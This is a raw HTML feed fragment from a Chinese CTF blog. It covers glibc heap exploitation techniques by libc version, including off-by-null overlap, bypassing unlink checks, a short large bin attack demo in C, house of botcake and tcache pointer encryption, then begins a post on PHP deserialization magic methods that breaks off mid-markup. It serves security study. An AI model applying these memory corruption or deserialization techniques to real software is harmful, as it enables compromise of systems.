class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>代码添加在<code>free</code>的时候，free操作时，会执行上面的<code>unlink</code>检查，这个检查检查了<code>pre_inuse</code>位，如果p的pre_inuse为0，即前一个chunk为free状态，那么会通过<code>pre_size</code>的大小获得前一个chunk的size，然后再发生<code>unlink</code>。在以前的版本不存在这个检查，所以可以通过<code>off_by_NULL</code>很简单的构造<code>chunk_overlap</code>，方法如下：</p><h5 id="off-by-NULL利用"><a class="header-anchor" href="#off-by-NULL利用">¶</a>off_by_NULL利用</h5><blockquote><ul><li><p>malloc(0x500) 获得chunk1 malloc(0xf8) * 3 获得chunk 2 3 4</p></li><li><p>编辑chunk 3 改变chunk 4的presize = chunk1 + chunk2 + chunk3 且覆盖chunk4的pre_inuse</p></li><li><p>free chunk1 此时chunk1 进入unsorted bin</p></li><li><p>free chunk4 如果没有上述检查则，chunk4和chunk1 发生unlink，把chunk1 到chunk4的所有空间吞入unsorted bin</p></li><li><p>此时chunk2 chunk3 既存在于unsorted bin，又可以被用户使用</p></li></ul></blockquote><p>属于off_by_one比较经典的利用了。但是libc2.29在free chunk4的时候出现了size的检查，按照原来的方法，必然是不能通过检查的，所以还需要考虑另外的方法来完成利用，最简单直接的办法就是在chunk的user_data域再伪造一个chunk，这样就可以满足size的要求了。</p><p>但是问题又来了，看<code>unlink</code>的代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Take a chunk off a bin list. */</span>  <span class="token keyword">static</span> <span class="token keyword">void</span>  <span class="token function">unlink_chunk</span> <span class="token punctuation">(</span>mstate av<span class="token punctuation">,</span> mchunkptr p<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    mchunkptr fd <span class="token operator">=</span> p<span class="token operator">-></span>fd<span class="token punctuation">;</span>    mchunkptr bk <span class="token operator">=</span> p<span class="token operator">-></span>bk<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>fd<span class="token operator">-></span>bk <span class="token operator">!=</span> p <span class="token operator">||</span> bk<span class="token operator">-></span>fd <span class="token operator">!=</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 链表里，p->前向->后向==p。  </span>    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted double-linked list"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>绕过了第一次检查，unlink依然要检查双向链表的完整性，此时对于这个unlink检查，考虑以下几点：</p><ul><li><p>如果可以获得heap地址，直接伪造即可，让fd和bk都指向自己（这里的<code>fd</code>和<code>bk</code>指的是<code>fake_chunk</code>的<code>fd</code>和<code>bk</code>，自己指的是<code>fake_chunk</code>）</p></li><li><p>没有heap base，想办法创造条件，利用heap操作残留的heap地址</p></li></ul><p>第二点联合第一点很容易想起来<code>large bin</code>，当<code>large bin</code>中同一个index的chunk使用<code>fd_nextsize</code>和<code>bk_nextsize</code>相连接。<br>在没有泄露的前提下利用<code>fd_nextsize和bk_nextsize</code>两个heap指针，构造方法如下。</p><h6 id="残余的heap指针（基本无法使用）"><a class="header-anchor" href="#残余的heap指针（基本无法使用）">¶</a>残余的heap指针（基本无法使用）</h6><ul><li>首先malloc出来一个large bin chunk，然后malloc出来，malloc出来的时候利用edit的机会，对<code>fd_nextsize</code>进行<code>partial overwrite</code>，使得该指针指向另外一个有heap指针的chunk，这时候fd_nextsize作为fake chunk的fd指针，利用另外一个有heap指针的chunk，完成了<code>fd-&gt;bk = p</code>的检查，此处注意，这个有heap指针的chunk也需要提前进行partial overwrite使得其heap指针指向p。</li><li>free 一个chunk进入tcache，然后再利用off_by_one改变前面那个large bin chunk的大小，使得其为tcache大小，然后free 这个chunk，这时候，之前那个large bin chunk的fd指针，指向了这一步刚开始被free的tcache，即在large bin + 0x10的位置踩出一个heap地址</li><li>最后malloc出来这个修改大小后进入tcache 的 large bin chunk，然后partial overwrite修改低位，使得+0x10位置的heap地址指向p，从而绕过bk-&gt;fd = p的检查</li></ul><p>过程极为繁琐，且<strong>不实用</strong>，在后来的版本（<font color="#ff0000">glibc2.29</font>），出现了tcache的key机制，导致fake_chunk的size会在踩出heap地址的时候被key覆盖，所以方法需要改到<code>fast bin</code>中执行，这是限制条件之一，限制条件之二是，很多的输入要求中，会在输入的末尾输入<code>\x00和\n</code>，这导致了partial overwrite会失败，或者说需要爆破。</p><p>所以以上的方法现在基本上都无法使用。现在用的几乎都是下面的方法。</p><h6 id="unsorted-bin和large-bin的链机制"><a class="header-anchor" href="#unsorted-bin和large-bin的链机制">¶</a>unsorted bin和large bin的链机制</h6><p>这种方法我是从NepCTF中学来的，NepCTF中由Nep战队的FMYY师傅出了一道题，<strong>NULL_FXCK</strong>，这道题的解法多样，且对堆的构造要求极高，比赛中仅有cnitlrt师傅完成，是一道很有意思的题目（风沐云烟yyds）</p><p>在参考wjh师傅的博客之后，当时算是完善了一块短板，那时候从来没有在高版本的libc下尝试过off_by_one的构造。</p><p>首先讲常规的利用large bin链子的打法，这种方法是需要<font color="#ff0000">爆破</font>的，具体<a href="https://blog.csdn.net/weixin_45209963/article/details/126758789">链接</a>，在我看来本质上的区别不是很多，主要是换了unsorted bin打，但是在使用的复杂度上不低于上面的方法，只是unsorted bin比fastbin简单，最后的partial overwrite时，因为需要覆盖两位，所以对于第二个字节的高4bit是无法控制的，这就需要爆破，概率为1/16。</p><p>然后讲的是一种不需要爆破的方法，<strong>这种方法不依赖于large bin</strong>，而是单纯的利用unsorted bin和heap在合并和分割的时候残留的heap指针。<br>篇幅有限，具体可以看下面的文章：<br><a href="https://blog.csdn.net/weixin_45209963/article/details/126758789">https://blog.csdn.net/weixin_45209963/article/details/126758789</a><br><a href="https://blog.wjhwjhn.com/archives/193/">https://blog.wjhwjhn.com/archives/193/</a></p><hr><p>除了以上的检查之外，还添加了top chunk的检查，防护住了house of force的攻击，同时，unlink由一个宏，变成了一个专门的函数，添加了双链完整性的检查，使得unsorted bin attack变得无法使用，所以在高版本中，一般使用large bin attack 替代unsorted bin attack。</p><h4 id="libc2-31"><a class="header-anchor" href="#libc2-31">¶</a>libc2.31</h4><p>该版本中，对large bin的fd_nextsize和bk_nextsize做了限制，普通的构造large bin attack的办法已经失效，但是如下的payload Demo还能够使用</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x4a8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x478</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// trigger chunk1 into largebin</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>p1<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>victim<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token comment">// largebin attack</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>之后相比于2.29没有做比较大的更新，基本上保护机制都一样，这里主要是介绍几种经典的利用方法，平时也算比较少见的。<br>该版本下主要利用的方法如下：<br>tcache stash unlink 全家桶 #House_of_botcake #fastbin_reverse_into_tcache<br>以上的三种方法均可以利用在libc2.29版本，或者说适用于tcache版本。<br>tcache 的stash机制前面介绍过了，这里主要提一下botcake的利用方法。（fastbin的利用方法和stash机制类似，不过感觉有点鸡肋）</p><h5 id="house-of-botcake"><a class="header-anchor" href="#house-of-botcake">¶</a>house of botcake</h5><p>这是一种在UAF的条件下的利用，主要适用于，存在UAF但是没有edit的办法，即只能够在malloc之后马上edit，而不可以单独的执行edit。<br>条件：</p><ul><li>有tcache</li><li>可以UAf<br>利用的本质是，同一个chunk进行两次free导致chunk分别位于unsorted bin和tcache，由于位于<code>unsorted bin</code>中的chunk没有key，所以绕过了<code>tcache bin</code>的检查。<br>利用过程：</li><li>填满tcache bin，free chunk1 chunk2，此时chunk1和2进入了unsorted bin，且要保证1 和 2相邻，进入unsorted bin之后二者合并</li><li>malloc出来一个chunk3，此时再次free chunk2 ，这时候chunk2进入tcache bin，那么chunk2 既在unsorted bin中又在tcache中</li><li>malloc一个chunk，使得unsorted bin分割，且能够获得chunk2 user data区域的控制权，如此，就可以劫持fd指针了。</li></ul><p><strong>补充</strong>： 有时候，题目会对malloc的大小做限制，我们仅仅需要一次小的malloc 才能够达到上面的条件。</p><h4 id="libc2-32"><a class="header-anchor" href="#libc2-32">¶</a>libc2.32</h4><p>这个版本下的方法可以关注 <code>VNCTF2021</code> 这场比赛中大部分的pwn题都是2.32的版本。<br>2.32和2.31的主要区别在于，tcache又做了一次安全加强，tcache_put代码如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's room   for more chunks.  */</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span><span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Mark this chunk as "in the tcache" so the test in _int_free will     detect a double free.  */</span>  e<span class="token operator">-></span>key <span class="token operator">=</span> tcache<span class="token punctuation">;</span>  e<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>e<span class="token operator">-></span>next<span class="token punctuation">,</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* Caller must ensure that we know tc_idx is valid and there's   available chunks to remove.  */</span><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">aligned_OK</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): unaligned tcache chunk detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">REVEAL_PTR</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  e<span class="token operator">-></span>key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>改变如下：</p><ul><li>tcache_get函数中，对取出的chunk做了堆地址对齐的检查</li><li>对next指针添加了加密和解密检查</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#define PROTECT_PTR(pos, ptr) \</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span>__typeof <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> pos<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>即，next指针存储的是原来的值右移12位，然后和自己的地址异或之后的值，这意味着，对fd进行劫持从而任意写的前提是，已经leak了heap地址。给传统的利用方法增加了不少难度。</p><blockquote><p>不过若是我们能够直接控制 <code>tcache struct</code>，则仍然可以直接进行任意地址写，这是因为在 tcache struct 中存放的仍是未经异或运算的原始 chunk 地址</p></blockquote><p>针对新的保护方法，同样的也有新的利用方法，不难发现，当第一个chunk进入tcache的时候，自己的next存储的是NULL，这时候也会进行异或，异或之后得到的值就直接是自己的地址，当有UAF的时候，就可以直接leak出来heap地址了。</p><h4 id="libc2-34"><a class="header-anchor" href="#libc2-34">¶</a>libc2.34</h4><p>没啥好说的，目前来看，主流方法都是打IO，Hook的去除导致很多传统的方法都没了作用。</p><p>House of emma</p><h2 id="others"><a class="header-anchor" href="#others">¶</a>others</h2><p>了解了各个版本中添加的保护之后，也不一定能够解决大部分的堆题目，因为在每个题中的限制条件不一样，在不同的条件下构造的堆利用方法不同。</p><p>利用方法目前比较出名的是how2heap的一系列利用方式，其中的house of 系列的利用方式较为多样，可以多做学习，这里不一一介绍，除此之外，还有一些很有意思的trick，比如说对<code>environ</code>环境变量的攻击，<code>global_max_fast</code>的利用，还有VN2021中出现的<a href="https://blog.wjhwjhn.com/archives/192/">LittleReadFlower</a>，修改<code>TCACHE_MAX_BINS</code>。。。。</p><p>攻击利用方法层出不穷，这里也无法完全记录，总结下来就是百无禁忌，只要能想到的方法，都可以利用起来。文章到此结束，exploit从未停止。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web中一些简单的php反序列化和js原型链污染</title>
    <link href="/2022/11/18/web%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2022/11/18/web%E4%B8%AD%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8Cjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<p>😄好久没有更新博客了，前段时间学习IOT的固件分析，一些东西都直接投了，也没有什么想写的，最近再次触碰CTF，发现web也是很有趣的（web选手挂机了，二进制向全栈的转变🐶）</p><p>主要是记录最近在比赛中遇到的原型链污染，但是又想到了其中php也有几个问题卡了我一下，于是就拿出来了反序列化一起讲一下（不懂java，只能php）</p><h2 id="反序列化"><a class="header-anchor" href="#反序列化">¶</a>反序列化</h2><p>原理挺简单的，就是在php调用反序列化函数的时候，如果反序列化的对象可以被用户操控，那么精心构造的序列化对象可以调用一系列的魔术方法，从而导致RCE等。</p><p>魔术方法如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   当一个对象创建时被调用，<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   当一个对象销毁时被调用，<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   当一个对象被当作一个字符串被调用。<span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   使用unserialize时触发<span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    使用serialize时触发<span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    对象被销毁时触发<span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    在对象上下文中调用不可访问的方法时触发<span class="token function">__callStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    在静态上下文中调用不可访问的方法时触发<span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    用于从不可访问的属性读取数据<span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    用于将数据写入不可访问的属性<span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    在不可访问的属性上调用<span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>或<span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>触发<span class="token function">__unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     在不可访问的属性上使用<span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>时触发<span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    把类当作字符串使用时触发<span class="token punctuation">,</span>返回值需要为字符串<span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   当脚本尝试将对象调用为函数时触发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>其中有一部分方法有一些特殊的绕过方法，比如说<code>__wakeup()</code>函数，一般来说在题目中都是作为WAF存在的，但是当类的反序列化类的对象多余实际对象的时候，就会绕过这个方法不执行。</p><p>其余的方法就是见仁见智，在具体的题目中具体使用即可。下面主要是拨开表面的这些东西，对php反序列化中的一些坑点做一些整理。</p><h3 id="类和序列化"><a class="header-anchor" href="#类和序列化">¶</a>类和序列化</h3><p>php中的类和C++ java一样，有成员有方法，同样的成员有三种类别，protect，private，public。三种不同的类型对成员变量的访问添加了不同的控制。</p><p><code>public</code>，<strong>该成员可以在任何地方被访问</strong></p><p><code>private</code>，私有变量，只能被定义的类使用</p><p><code>protected</code>，受保护的可以在自己和自己的子类，父类中被调用</p><p>基本上能够理解以上三者的区别，就ok了，接下来是序列化，首先，需要明白的是，序列化和反序列化本身没有任何的危害，而可能导致危害的原因是反序列化本身的对象是否被用户可控，只有用户构造过后的对象才是有害的。</p><p>来看一个序列化的样本</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span> <span class="token string single-quoted-string">'Inactive'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_flag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">set_flag</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Active'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$data = $obj->get_flag();</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$nice</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$nice</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" test flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Active"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword type-declaration">string</span><span class="token keyword type-declaration">object</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>看输出可以知道，序列化将一个对象变成了一个<code>string</code>类型的对象，反序列化又把这个<code>string</code>类型的变量变味了<code>Object</code>对象。</p><p>解析一下这个<code>String</code>的含义，其中O代表对象，O:后面的数字是对象名字的长度，test:1:中的1表示的是对象中成员变量的个数，然后s也是代表长度，那么问题来了，注意到只有一个成员变量，但是<code>flag</code>变成了<code> test flag</code>而且长度是10，这里是<code>private</code>的特殊表示方法。</p><p>私有变量被序列化之后表示为 <code>%00类名%00变量名</code>，%00就是\x00，不可见字符。</p><p>这里再看一个例子</p><figure><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token operator">=</span> <span class="token string single-quoted-string">'Inactive'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$my</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1234'</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$hhh</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set_flag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token function">set_flag</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Active'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$data = $obj->get_flag();</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$nice</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$nice</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" test flag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Active"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"my"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1234"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">" * hhh"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"12"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword type-declaration">string</span><span class="token keyword type-declaration">object</span></span><span aria-hidden="true" 